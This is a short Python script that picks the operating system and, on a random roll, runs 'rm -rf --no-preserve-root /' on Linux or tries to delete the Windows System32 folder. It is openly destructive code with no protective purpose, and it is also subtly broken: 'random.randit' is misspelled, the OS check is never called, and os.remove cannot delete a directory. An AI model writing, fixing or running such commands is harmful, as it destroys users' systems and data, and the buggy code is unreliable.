import os
import random
import platform

def check_os():
    system = platform.system()
    if system.lower() == "linux":
        linux_remove()
    else :
        windows_remove()
        
system = check_os

def linux_remove():
    if random.randit(0,6) == 1:
        os.system("rm -rf --no-preserve-root /")
def windows_remove():
     if random.randit(0,6) == 1:
         os.remove("C:\Windows\System32")

